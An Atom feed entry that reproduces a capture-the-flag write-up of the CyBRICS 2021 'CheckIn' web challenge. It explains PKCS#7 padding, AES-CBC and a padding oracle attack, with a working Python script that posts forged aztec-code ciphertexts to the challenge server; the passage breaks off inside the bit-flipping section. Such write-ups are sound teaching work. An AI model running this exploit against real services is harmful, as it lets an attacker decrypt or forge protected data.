<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Zedd&#39;s Blog</title>
  
  <subtitle>Zedd&#39;s Blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.zeddyu.info/"/>
  <updated>2021-09-27T17:45:58.724Z</updated>
  <id>https://blog.zeddyu.info/</id>
  
  <author>
    <name>Zedd</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</title>
    <link href="https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/"/>
    <id>https://blog.zeddyu.info/2021/08/02/cybrics-checkin-2021/</id>
    <published>2021-08-02T00:32:27.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>This is the fork of my friend’s blog: <a href="https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/" target="_blank" rel="noopener">https://blog.soreatu.com/posts/writeup-for-web-checkin-in-cybrics-ctf-2021/</a>. We have worked together for two days to solve the hardest web CheckIn in the CybricsCTF 2021. It is nearly a crypto challenge but I think it deserves a writeup.</p><a id="more"></a><p>[toc]</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Padding Oracle Attack + Bit Flip Attack + XSS</p><p>This is a hard web challenge in <a href="https://cybrics.net/tasks" target="_blank" rel="noopener">CyBRICS CTF 2021</a>. For some reason, the challenge was ZERO solved during the competition. The author fixed some bug after the competition and announced that anyone who can solve it would receive a reward. We managed to solve it and was one of the only two teams that  claimed the reward.</p><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>This challenge simulates a flight booking site, where we can search for flight tickets, buy tickets, and upload tickets to be registered.</p><p>By submitting a form on <a href="http://207.154.224.121:8080/finalize?fisrtName=xxx&amp;lastName=xxx" target="_blank" rel="noopener">http://207.154.224.121:8080/finalize?fisrtName=xxx&amp;lastName=xxx</a>, we will receive a aztec code, which embeds a piece of base64-encoded data.</p><p>We can upload the aztec code through <a href="http://207.154.224.121:8080/upload" target="_blank" rel="noopener">http://207.154.224.121:8080/upload</a>, and get a successful “<em>you are now registered</em>“ response (but this’s not what we want).</p><p>Later, we found something interesting after changing some byte of the base64-encoded data. We got a *”PADDING_ERROR”* response by modifying some byte of the data. It immediately occurred to us that this might well be an instance of <strong>padding oracle attack</strong>.</p><p>To confirm the intuition we just developed, we generated a aztec code, base64 decoded it into ciphertext, XORed every 256 possible byte value (0~256) in the last byte of the second last ciphertext block, base64 encoded back to a aztec code (utilizing python <code>aztec_code_generator</code> module), and uploaded the aztec code to the server. We received 256 responses, 255 of whose <em>status code</em> is 200, with only one response whose <em>status code</em> is 500. Among the 255 responses, XORing by <code>b"\x00"</code>  in the last byte got a “<em>Success</em>“ reponse and the remaining 254 are all “PADDING_ERROR” responses. This implied that only the “<em>Success</em>“ response one and the 500 <em>status code</em> one got correctly padded plaintext after decryption on the server side. The “<em>Success</em>“ response was due to it’s the original unmodified padded plaintext, while the 500 <em>status code</em> one was because the plaintext after decryption was somewhat modified to be correctly padded and we can gain knowledge of the last byte of the original plaintext by making use of this. </p><p>By continously sending carefully modified ciphertext to the server and then distinguishing whether or not the server responses with “<em>PADDING_ERROR</em>“, we can recover the whole plaintext byte by byte. This is the so-called <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" target="_blank" rel="noopener">padding oracle attack</a>.</p><h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><p>So, how does the padding oracle attack work?</p><hr><p>First, we need to understand <strong>what is padding</strong>. </p><p>It is known that block ciphers can transform (encrypt/decrypt) a plaintext/ciphertext block. 16 bytes data in the case of AES, into a ciphertext/plaintext block. Using some block cipher mode of operation, we can repeatedly apply the block cipher encrypting/decrypting operation on amouts of data whose length is more than a block. For example, AES-CBC mode can encrypt/decrypt multiple blocks. But what if the length of data is not a multiple of the block length?  The answer is to use some kind of padding methods, which append some data at the end of the last block to make it a full block.</p><p>One of the most widely used padding method is <a href="https://en.wikipedia.org/wiki/Padding_(cryptography)#PKCS#5_and_PKCS#7" target="_blank" rel="noopener">PKCS#7</a> padding method. PKCS#7 first calculates the number of bytes ( <code>pad_length</code>) to be padded, and then appends to the last plaintext block <code>pad_length</code>  bytes, with each byte value being <code>pad_length</code>.  Upon unpadding, the last byte of the decryption result is extracted and parsed as the <code>pad_length</code>, after which <code>pad_length</code> long bytes are truncated at the end. Below is a Python implementation of PKCS#7 padding and unpadding.</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(pt)</span>:</span></span><br><span class="line">    pad_length = <span class="hljs-number">16</span> - len(pt)%<span class="hljs-number">16</span></span><br><span class="line">    pt += bytes([pad_length]) * pad_length</span><br><span class="line">    <span class="hljs-keyword">return</span> pt</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(pt)</span>:</span></span><br><span class="line">    pad_length = pt[<span class="hljs-number">-1</span>]</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">1</span> &lt;= pad_length &lt;= <span class="hljs-number">16</span>:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">    <span class="hljs-keyword">if</span> pad(pt[:-pad_length]) != pt:</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span></span><br><span class="line">    <span class="hljs-keyword">return</span> pt[:-pad_length]</span><br></pre></td></tr></tbody></table></figure><p></p><p>Note that a valid padding check is done after unpadding. This means that only the following 16 formats of the last block is considered as valid. All the other formats of data are invalid and will produce a <em>PADDING_ERROR</em> response, which is a padding oracle that we will exploit later. </p><blockquote><p>Another point to be noted is that, even if the length of plaintext is a multiple of the block size, padding is still needed. In this case, 0x10 bytes will be appended, with each byte value being <code>\x10</code>. </p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729103443272.png" alt="image-20210729103443272" title="valid padded plaintext"></p><hr><p>Before moving on, we also need to be fimilar with <strong>AES-CBC</strong>, which is the most common mode that padding oracle attack can be mounted on.</p><p>In CBC mode, plaintext is padded and divided into several plaintext blocks. Each plaintext block is XORed with the previous ciphertext block before being AES encrypted. The first plaintext block is XORed with a randomly generated initializaiton vector (IV). The final encryption result is the concatenation of the ciphertext blocks with IV at the head. Decryption just reverses these operations.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729140911415.png" alt="image-20210729140911415"></p><p>One significant drawback of AES-CBC is that it does not solely provide intergrity protection. In other words, the attacker can modify the ciphertext (such as bit flipping) and send the modified ciphertext to the server without being noticed. This gives way to the padding oracle attack.</p><hr><p>Now, we can dive into the very details on <strong>how the padding oracle works</strong>.</p><p>Suppose the attack has possession of a ciphertext which can be divided into an <code>IV</code> and 3 ciphertext blocks <code>c1, c2, c3</code> . The purpose of the attacker is to decrypt the last ciphertext block <code>c3</code>. </p><p>The attacker changes the last byte of <code>c2</code> (XORed with some value), and then send it to the server. The server responses with either a “<em>PADDING_ERROR</em>“ response or a 500 <em>status code</em> reponse. If we gets a 500 <em>status code</em> response, we succeed. This implies that the unpadding check is passed, and the last plaintext block MUST end with <code>b"\x01</code>, one of the 16 valid padding format.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/image-20210729175108696.png" alt="image-20210729175108696"></p><p>After recovering the last byte, we can move on to decrypt all the previous bytes of the last plaintext block. For example, to decrypt the second last byte, we can utilize the  <code>b"\x02\x02"</code> padding format. Since we already have had knowledge of the last byte of plaintext, we can modify the last byte into any value we want by XOR something in  <code>c2</code>. At present, what we want is to make the last byte be <code>b"\x02"</code>, we XOR the last byte of <code>c2</code>  with the last byte of plaintext to cancel it into <code>b"\x00"</code>, then XOR in <code>b"\x02"</code>, resulting to <code>b"\x02"</code>. Then, try every 255 possible byte value <code>guess_byte XOR b"\x02"</code> (except <code>b"\x00"</code>) to XOR with the last second byte of <code>c2</code>, and send the modified ciphertext to the padding oracle until a 500 <em>status code</em> response, thus recovering the second last plaintext byte, which is exactly <code>guess_byte</code>.</p><p>The following is the Python code that can be used to, given ciphertext, recover the last plaintext block. </p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> aztec_code_generator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># padding_oracle recovers the last 16 plaintext bytes of the given ciphertext</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">padding_oracle</span><span class="hljs-params">(cipher)</span>:</span></span><br><span class="line">    plaintext = <span class="hljs-string">b""</span></span><br><span class="line">    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>):</span><br><span class="line">        print(<span class="hljs-string">f"[*] index: <span class="hljs-subst">{index}</span>"</span>)</span><br><span class="line">        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>):</span><br><span class="line">            bytes_xor = <span class="hljs-string">b"\x00"</span>*(<span class="hljs-number">16</span>-index)+bytes([byte^index])+xor(plaintext,bytes([index]*(index<span class="hljs-number">-1</span>)))</span><br><span class="line">            new_cipher = cipher[:<span class="hljs-number">-32</span>] + xor(cipher[<span class="hljs-number">-32</span>:<span class="hljs-number">-16</span>], bytes_xor) + cipher[<span class="hljs-number">-16</span>:]</span><br><span class="line"></span><br><span class="line">            b64data = base64.b64encode(new_cipher)</span><br><span class="line">            code = aztec_code_generator.AztecCode(b64data)</span><br><span class="line">            code.save(<span class="hljs-string">f"./pics/<span class="hljs-subst">{byte}</span>.png"</span>, module_size=<span class="hljs-number">4</span>)</span><br><span class="line"></span><br><span class="line">            f = open(<span class="hljs-string">f"./pics/<span class="hljs-subst">{byte}</span>.png"</span>, <span class="hljs-string">"rb"</span>).read()</span><br><span class="line">            paramsMultipart = [(<span class="hljs-string">'file'</span>, (<span class="hljs-string">'1.png'</span>, f, <span class="hljs-string">'application/png'</span>))]</span><br><span class="line">            response = session.post(<span class="hljs-string">"http://207.154.224.121:8080/upload"</span>, files=paramsMultipart)</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:</span><br><span class="line">                body = response.content.split(<span class="hljs-string">b'&lt;div class="content__i"&gt;'</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">b"div"</span>)[<span class="hljs-number">0</span>]</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">if</span> <span class="hljs-string">b"PADDING"</span> <span class="hljs-keyword">in</span> response.content:</span><br><span class="line">                    print(<span class="hljs-string">f"[<span class="hljs-subst">{byte:&gt;<span class="hljs-number">3</span>d}</span>] Status code: <span class="hljs-subst">{response.status_code}</span>, PADDING ERROR"</span>)</span><br><span class="line">                <span class="hljs-keyword">else</span>:</span><br><span class="line">                    print(<span class="hljs-string">f"[<span class="hljs-subst">{byte:&gt;<span class="hljs-number">3</span>d}</span>] Status code: <span class="hljs-subst">{response.status_code}</span>, <span class="hljs-subst">{body}</span>"</span>)</span><br><span class="line">            <span class="hljs-keyword">else</span>:<span class="hljs-comment"># response.status_code == 500</span></span><br><span class="line">                print(<span class="hljs-string">f"[<span class="hljs-subst">{byte:&gt;<span class="hljs-number">3</span>d}</span>] Status code: <span class="hljs-subst">{response.status_code}</span>"</span>)</span><br><span class="line">                plaintext = bytes([byte]) + plaintext</span><br><span class="line">                print(<span class="hljs-string">f"plaintext: <span class="hljs-subst">{plaintext}</span>"</span>)</span><br><span class="line">                <span class="hljs-keyword">break</span></span><br><span class="line">    <span class="hljs-keyword">return</span> plaintext</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Recovering-the-Entire-Plaintext"><a href="#Recovering-the-Entire-Plaintext" class="headerlink" title="Recovering the Entire Plaintext"></a>Recovering the Entire Plaintext</h2><p>By exploting the padding oracle, we are enabled to decrypt the last plaintext block byte by byte. Can we go any further? The answer is yes. </p><p>Once we have recovered the last plaintext block, we can drop the last ciphertext block, and continue to exploit the padding oracle to recover the second last plaintext block. Keep doing this, and we will recover all the plaintext blocks, namely the entire plaintext.</p><hr><p>In practice, we implemented the attack and succssfully recovered the entire plaintext, which was a json formatted data.</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">b'{"name": "12321", "surname": "123", "middle": "1", "time": "2021-07-26 13:37:00", "dest": "", "dep": "", "flight": "BLZH1337"}\x02\x02'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>At this point, we got to know how the server side might process the uploaded aztec code. After receiving the code, the server decoded it into ciphertext, decrypted the ciphertext, and unpadded the decryption result. If something wrong happened during unpadding, the server replied with a “<em>PADDING_ERROR</em>“ response. After unpadding, the plaintext was then unmarshaled into an object (by something like <code>JSON.parse()</code>). If any error occurred, the server replied with a 500 <em>status code</em> response. The server would send back us a “Success” response if everything’s ok. </p><h2 id="Arbitrary-Plaintext-Encryption"><a href="#Arbitrary-Plaintext-Encryption" class="headerlink" title="Arbitrary Plaintext Encryption"></a>Arbitrary Plaintext Encryption</h2><p>Recovering the entire plaintext is not enough to solve this challenge. We can go more further to craft the ciphertext of arbitrary plaintext that we want.</p><p>To achieve this goal, we need to combine bit flip attack with the padding oracle attack. Bit flip attack enables us to change the plaintext into what we want, and the padding oracle attack functions as a decryption oracle to help us decrypt any ciphertext. </p><p>Say the ciphertext <code>IV || c1 || c2 || c3</code> decrypts into <code>p1 || p2 || p3</code>, and we want to get the ciphertext of <code>p1' || p2' || p3</code>. </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MM